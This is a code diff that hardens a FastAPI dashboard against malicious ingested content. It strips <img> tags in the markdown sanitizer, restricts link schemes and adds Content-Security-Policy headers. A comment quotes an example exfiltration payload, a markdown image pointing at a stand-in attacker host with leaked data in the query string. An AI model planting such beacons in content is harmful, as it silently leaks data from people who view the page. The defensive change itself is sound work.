@@ -44,7 +44,17 @@ def create_app(config: DistillConfig) -> FastAPI:
 
         def md_filter(text: str) -> str:
             html = md_lib.markdown(text, extensions=["tables", "fenced_code"])
-            return nh3.clean(html)
+            # Drop <img>: an injected `![](http://attacker/leak?d=...)` in
+            # ingested content would otherwise survive nh3 and auto-load on page
+            # view -- a zero-click exfiltration beacon. Also restrict link
+            # schemes and mark links noopener/nofollow. nh3 already strips
+            # scripts and event handlers.
+            return nh3.clean(
+                html,
+                tags=nh3.ALLOWED_TAGS - {"img"},
+                url_schemes={"http", "https", "mailto"},
+                link_rel="noopener noreferrer nofollow",
+            )
 
     except ImportError:
         md_filter = _escape_all
@@ -56,6 +66,21 @@ def create_app(config: DistillConfig) -> FastAPI:
     templates.env.filters["strip_frontmatter"] = strip_frontmatter
 
     app.state.templates = templates
+
+    @app.middleware("http")
+    async def _security_headers(request, call_next):  # type: ignore[no-untyped-def]
+        # Defense-in-depth for the dashboard, which renders untrusted ingested
+        # content: block external images/connections (exfil beacons) even if the
+        # sanitizer regresses. 'unsafe-inline' is allowed for the dashboard's own
+        # inline styles/scripts; img-src/default-src 'self' is the exfil defense.
+        response = await call_next(request)
+        response.headers["Content-Security-Policy"] = (
+            "default-src 'self'; img-src 'self'; "
+            "style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline'; "
+            "base-uri 'none'; form-action 'self'"
+        )
+        response.headers["Referrer-Policy"] = "no-referrer"
+        return response
 
     from distill.web.routes import channels, costs, dashboard, topics, videos, watchlist
 
